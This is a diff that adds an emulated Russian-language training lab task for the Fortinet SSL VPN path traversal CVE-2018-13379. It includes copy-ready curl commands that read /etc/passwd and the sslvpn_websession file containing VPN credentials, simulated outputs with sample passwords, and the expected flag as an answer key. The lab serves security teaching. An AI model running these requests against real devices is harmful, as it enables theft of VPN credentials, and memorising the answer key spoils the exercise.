@@ -1,0 +1,47 @@
+{
+  "id": "web-fortinet-ssl-vpn",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{f0rt1n3t_fgt_l4ng_sslvpn_s3ss10n_p4ssw0rds}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Fortinet CVE-2018-13379\n\nЦель: `https://fortigate.local`. Traversal — в параметре `lang` эндпоинта `/remote/fgt_lang`.\n\n1. Проверь обход пути — прочитай безобидный файл:\n   curl -s -k 'https://fortigate.local/remote/fgt_lang?lang=/../../../../../../etc/passwd'\n\n2. Дочитай до сессионного файла (там логины и пароли пользователей VPN):\n   curl -s -k 'https://fortigate.local/remote/fgt_lang?lang=/../../../../../../dev/cmdb/sslvpn_websession'\n\n3. В файле среди сессий — строка с флагом.\n   Сохрани флаг в found.txt и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция fortigate.local)",
+      "cases": [
+        {
+          "match": "sslvpn_websession",
+          "example": "-s -k 'https://fortigate.local/remote/fgt_lang?lang=/../../../../../../dev/cmdb/sslvpn_websession'",
+          "output": "var fgt_lang = \"en\";\n172.16.1.50:443:user=jsmith:pass=SecretPass:...\n10.0.0.7:443:user=admin:pass=Adm1nP@ss:...\nnto{f0rt1n3t_fgt_l4ng_sslvpn_s3ss10n_p4ssw0rds}\n"
+        },
+        {
+          "match": "etc/passwd",
+          "example": "-s -k 'https://fortigate.local/remote/fgt_lang?lang=/../../../../../../etc/passwd'",
+          "output": "root:x:0:0:root:/root:/bin/sh\nadmin:x:1000:1000::/home/admin:/bin/sh\n"
+        },
+        {
+          "match": "fgt_lang",
+          "example": "-s -k 'https://fortigate.local/remote/fgt_lang?lang=/../../../../..'",
+          "output": "var fgt_lang = \"en\";\n"
+        },
+        {
+          "match": "remote/login",
+          "example": "-s -k -I https://fortigate.local/remote/login",
+          "output": "HTTP/2 200\nserver: xxxxxxxx-xxxxx\ncontent-type: text/html\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только fortigate.local"
+    }
+  }
+}
